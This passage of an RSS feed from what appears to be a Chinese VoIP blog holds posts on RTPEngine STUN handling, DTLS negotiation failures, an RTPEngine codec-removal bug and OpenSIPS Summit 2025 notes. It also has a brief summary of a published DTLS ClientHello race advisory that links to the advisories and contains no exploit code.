&lt;li&gt;录音文件内容&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;录音文件用wireshark分析，可以听到主被叫双方的声音。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;其他&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除了录音文件，一些录音的元数据，例如SDP之类的信息，会被记录到录音的目录下。&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP安全 - DTLS client Hello 攻击白皮书</title>
      <link>https://wdd.js.org/posts/2025/dtls-hello-attack/</link>
      <pubDate>Mon, 14 Jul 2025 23:13:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/dtls-hello-attack/</guid>
      <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;攻击者伪造DTLS ClientHello消息，在SIP服务器和客户端之间建立一个非预期的连接。导致正常链接被阻断。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;影响软件&#34;&gt;影响软件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;FreeSWITCH&lt;/li&gt;
&lt;li&gt;RTPengine&lt;/li&gt;
&lt;li&gt;asterisk&lt;/li&gt;
&lt;li&gt;FreePBX&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;漏洞白皮书&#34;&gt;漏洞白皮书&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;./webrtc-hello-race-conditions-paper.pdf&#34;&gt;webrtc-hello-race-conditions-paper&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;表现&#34;&gt;表现&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;应答后呼叫无声&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/EnableSecurity/advisories/tree/master/ES2023-03-rtpengine-dtls-hello-race&#34;&gt;https://github.com/EnableSecurity/advisories/tree/master/ES2023-03-rtpengine-dtls-hello-race&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/EnableSecurity/advisories/tree/master/ES2023-02-freeswitch-dtls-hello-race&#34;&gt;https://github.com/EnableSecurity/advisories/tree/master/ES2023-02-freeswitch-dtls-hello-race&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/EnableSecurity/advisories/tree/master/ES2023-03-rtpengine-dtls-hello-race&#34;&gt;https://github.com/EnableSecurity/advisories/tree/master/ES2023-03-rtpengine-dtls-hello-race&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>OpenSIPS Summit 2025 速看</title>
      <link>https://wdd.js.org/posts/2025/opensips-summit-2025/</link>
      <pubDate>Mon, 14 Jul 2025 21:52:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/opensips-summit-2025/</guid>
      <description>&lt;p&gt;2025 年 5 月 27 - 5 月 30 日, OpenSIPS Summit 2025 在荷兰阿姆斯特丹举行。&lt;/p&gt;
&lt;p&gt;最近我才有时间，看完所有的会议资料，包括 PDF 和 PPT。&lt;/p&gt;
&lt;p&gt;下面是我整理的，认为比较有价值的一些内容。以飨读者。&lt;/p&gt;
&lt;h1 id=&#34;1-加强-sdp-处理&#34;&gt;1. 加强 SDP 处理&lt;/h1&gt;
&lt;p&gt;对 SDP 的处理，如果用 OpenSIPS 脚本来做，将会非常蹩脚。 生产环境一般都是使用 rtpengine 或者 rtpproxy 来处理。&lt;/p&gt;
&lt;p&gt;但是，最近的 OpenSIPS 版本，已经可以支持 SDP 处理了。 可以直接在 OpenSIPS 脚本里处理 SDP。&lt;/p&gt;
&lt;p&gt;说实话，我看了新的方案，我觉得，还不如用 rtpengine 或者 rtpproxy。&lt;/p&gt;
&lt;p&gt;但是聊胜于无吧，感兴趣的可以看看原文。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;./OpenSIPS%20Summit%202025%20-%20Liviu%20Chircu%20-%20Enhanced%20Media%20Operations%20with%20Structured%20SDP.pdf&#34;&gt;OpenSIPS Summit 2025 - Liviu Chircu - Enhanced Media Operations with Structured SDP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;除此以外，PDF 也提到一些有趣的事情，比如 SDP 随着时间推移，增强和很多功能，包也变得越来越大&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;时期&lt;/th&gt;
          &lt;th&gt;内容&lt;/th&gt;
          &lt;th&gt;包大小&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1998&lt;/td&gt;
          &lt;td&gt;基本媒体行&lt;/td&gt;
          &lt;td&gt;200-400 bytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2002&lt;/td&gt;
          &lt;td&gt;编码协商，rtpmap&lt;/td&gt;
          &lt;td&gt;500-1000 bytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2010&lt;/td&gt;
          &lt;td&gt;ICE/DTLS&lt;/td&gt;
          &lt;td&gt;1-2 kb&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2015&lt;/td&gt;
          &lt;td&gt;WebRTC, Simulcast, Bound, MID&lt;/td&gt;
          &lt;td&gt;2-3kb&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;在线会议，SFU&lt;/td&gt;
          &lt;td&gt;3-5 kb&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;可以想象，随着媒体能力的增强，UDP包的SIP信令中的分片几乎成为必然，所以，是否可以考虑有限使用TCP/TLS来传输信令呢？&lt;/p&gt;</description>
    </item>
    <item>
      <title>RTPEngine STUN包处理流程</title>
      <link>https://wdd.js.org/posts/2025/rtpengine-stun-flow/</link>
      <pubDate>Thu, 03 Jul 2025 22:26:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/rtpengine-stun-flow/</guid>
      <description>&lt;h1 id=&#34;stun-请求处理&#34;&gt;STUN 请求处理&lt;/h1&gt;
&lt;pre class=&#34;mermaid&#34;&gt;flowchart TD

__wildcard_endpoint_map--&amp;gt;__assign_stream_fds
monologue_offer_answer--&amp;gt;__assign_stream_fds
monologue_publish--&amp;gt;__assign_stream_fds
monologue_subscribe_request1--&amp;gt;__assign_stream_fds
call_make_transform_media--&amp;gt;__assign_stream_fds

__wildcard_endpoint_map --&amp;gt;__get_endpoint_map
monologue_offer_answer --&amp;gt;__get_endpoint_map
monologue_publish --&amp;gt;__get_endpoint_map
monologue_subscribe_request1 --&amp;gt;__get_endpoint_map
call_make_transform_media --&amp;gt;__get_endpoint_map

__assign_stream_fds --&amp;gt; stream_fd_new
__get_endpoint_map --&amp;gt; stream_fd_new

stream_fd_new --&amp;gt; stream_fd_recv

stream_fd_new--&amp;gt;stream_fd_readable
stream_fd_readable--&amp;gt;__stream_fd_readable
stream_fd_recv--&amp;gt;
__stream_fd_readable--&amp;gt;
stream_packet--&amp;gt;
media_demux_protocols --&amp;gt; 
stun --&amp;gt; __stun_request --&amp;gt; ice_request
&lt;/pre&gt;
&lt;p&gt;从SDP Offer之后，stream_fd_new 函数里做了几个事件订阅， 当对应的的媒体端口收到包之后，这个包可能是好几种协议，例如RTP, DTLS, STUN等。&lt;/p&gt;
&lt;p&gt;在media_demux_protocols() 中决定了这个包是以上包的哪一种， 如果是STUN包，则进入stun()中处理。&lt;/p&gt;
&lt;p&gt;STUN包也分为请求和响应，当消息是响应时，进入ice_request().&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ice_request&lt;/span&gt;(stream_fd &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sfd, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;endpoint_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; stun_attrs &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;attrs)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; packet_stream &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sfd&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;stream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; call_media &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;media &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ps&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;media;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; ice_agent &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ag;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;err;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; ice_candidate &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cand;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; ice_candidate_pair &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pair;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ret;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex; background-color:#3c3d38&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ilogs&lt;/span&gt;(ice, LOG_DEBUG, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Received ICE/STUN request from %s on %s&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex; background-color:#3c3d38&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;endpoint_print_buf&lt;/span&gt;(src),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex; background-color:#3c3d38&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;endpoint_print_buf&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sfd&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;socket.local));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre class=&#34;mermaid&#34;&gt;flowchart TD
ice_update--&amp;gt;__do_ice_checks
ice_agents_timer_run--&amp;gt;__do_ice_checks

__do_ice_checks --&amp;gt; __do_ice_check
&lt;/pre&gt;</description>
    </item>
    <item>
      <title>DTLS协商失败导致无声问题</title>
      <link>https://wdd.js.org/posts/2025/dtls-negotiation-failed-no-audio/</link>
      <pubDate>Tue, 24 Jun 2025 21:06:11 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/dtls-negotiation-failed-no-audio/</guid>
      <description>&lt;h1 id=&#34;1-简介&#34;&gt;1. 简介&lt;/h1&gt;
&lt;p&gt;DTLS（Datagram Transport Layer Security，数据报传输层安全协议）是一种为基于数据报的应用（如UDP）提供安全通信的协议。它是TLS（传输层安全协议）的扩展，专门设计用于不可靠的传输协议（如UDP），以实现数据加密、身份认证和消息完整性保护。DTLS常用于VoIP、视频会议、WebRTC等实时通信场景。&lt;/p&gt;
&lt;p&gt;DTLS在WebRTC音视频中是强制必须使用的，否则媒体协商阶段就会失败。&lt;/p&gt;
&lt;p&gt;使用DTLS后，就算中间人从网络中抓包，抓到了RTP流，在播放RTP流时，里面也全是噪声，无法播放的。&lt;/p&gt;
&lt;p&gt;今天要讲的是就是DTLS协商失败导致电话即使接通，也无声的问题。&lt;/p&gt;
&lt;h1 id=&#34;2-网络结构说明&#34;&gt;2. 网络结构说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;UAS: sip server, OpenSIPS + RTPEngine组成&lt;/li&gt;
&lt;li&gt;UAC: WebRTC 分机&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F1. UAS ----&amp;gt; UAC: INVITE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SDP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F2. UAS &amp;lt;---- UAC: &lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F3. UAS &amp;lt;---- UAC: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; Ok &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SDP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;F4. UAS ----&amp;gt; UAC: ACK
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从SIP信令上看，被叫应答后，UAS和UAC之间的双向媒体流应该建立起来，但是实际上却无声。&lt;/p&gt;
&lt;h1 id=&#34;3-icestundtls&#34;&gt;3. ICE/STUN/DTLS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ICE&lt;/strong&gt;: WebRTC中的ICE（Interactive Connectivity Establishment，交互式连接建立）是一种网络协议，用于帮助WebRTC客户端在不同网络环境下建立点对点（P2P）连接。ICE的主要作用是解决NAT穿透和防火墙问题，使两个终端能够找到最佳的通信路径。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;STUN&lt;/strong&gt;: WebRTC中的STUN（Session Traversal Utilities for NAT，NAT会话穿越实用工具）是一种网络协议，主要用于帮助客户端发现自己的公网IP地址和端口。由于很多设备处于NAT（网络地址转换）或防火墙之后，直接通信会遇到障碍，STUN可以让客户端知道外部网络如何访问自己&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在分机应答后，并在WebRTC发送本地媒体流前，还需要两个步骤协商完成UAC才会发送语音流&lt;/p&gt;
&lt;h2 id=&#34;31-stun协商&#34;&gt;3.1 STUN协商&lt;/h2&gt;
&lt;p&gt;UAC收到来自UAS的SDP, 里面一般有如下内容&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio &lt;span style=&#34;color:#ae81ff&#34;&gt;54322&lt;/span&gt; UDP/TLS/RTP/SAVPF &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ice-ufrag:abcd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ice-pwd:1234567890abcdef
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ice-options:trickle
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fingerprint:sha-256 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;setup:actpass
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;candidate:1 &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; udp &lt;span style=&#34;color:#ae81ff&#34;&gt;2130706431&lt;/span&gt; 1.2.3.4 &lt;span style=&#34;color:#ae81ff&#34;&gt;54322&lt;/span&gt; typ host
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;STUN是一个请求响应模型的协议。UAC将会向&lt;code&gt;a=candidate&lt;/code&gt;里的1.2.3.4:54322 发送UDP消息&lt;/p&gt;</description>
    </item>
    <item>
      <title>RTPEngine mr13版本, 特殊的fmtp参数会导致某些语音编码被移除</title>
      <link>https://wdd.js.org/posts/2025/rtpengine-fmtp-g711-remove-codec/</link>
      <pubDate>Wed, 18 Jun 2025 20:04:52 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2025/rtpengine-fmtp-g711-remove-codec/</guid>
      <description>&lt;h1 id=&#34;场景说明&#34;&gt;场景说明&lt;/h1&gt;
&lt;p&gt;如下图所示&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Offer阶段，F1, F2 步骤里PCMU编码有个fmtp参数&lt;code&gt;abc=no&lt;/code&gt;, 这个参数可能只对呼叫发起方有意义，对被叫方来说，只会被忽略。&lt;/li&gt;
&lt;li&gt;Answer阶段, 例如被叫是个FreeSWITCH, 它不认识abc=no, 就直接忽略，然后应答编码是PCMU。但是rtpengine认为不带abc=no的参数，就认为这个PCMU的编码是不可能被选中的，然后就直接删掉了PCMU编码， 只保留了一个101编码&lt;/li&gt;
&lt;li&gt;由于主叫收到101的编码，而没有语音的编码，所以主叫收到200 Ok后立马就发送了BYE&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// F1: send offer to rtpegnine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt; RTP/AVP &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:0 PCMU/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:0 abc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:8 PCMA/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:8 abc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:101 telephone-event/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:101 0-15
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// F2: receive offer from rtpengine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio PORT RTP/AVP &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;IN IP4 203.0.113.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:0 PCMU/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:0 abc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:8 PCMA/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:8 abc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:101 telephone-event/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:101 0-15
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// F3: send answer to rtepngine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio &lt;span style=&#34;color:#ae81ff&#34;&gt;2002&lt;/span&gt; RTP/AVP &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:0 PCMU/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:101 telephone-event/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:101 0-15
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// F4: expect receive answer from rtpengine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio PORT RTP/AVP &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;
